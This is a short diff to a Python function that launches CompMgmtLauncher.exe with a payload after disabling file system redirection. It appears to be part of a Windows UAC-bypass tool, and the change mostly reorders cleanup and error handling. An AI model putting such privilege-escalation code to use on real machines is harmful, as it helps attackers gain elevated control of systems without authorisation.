@@ -40,15 +40,14 @@ def compmgmtlauncher(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create("CompMgmtLauncher.exe"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
+				time.sleep(5)
+				compmgmtlauncher_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				if "error" in Constant.output:
-					compmgmtlauncher_cleanup(path)
-
-		time.sleep(5)
-
-		if not compmgmtlauncher_cleanup(path):
-			print_success("All done!")
+				for x in Constant.output:
+					if "error" in x:
+						compmgmtlauncher_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
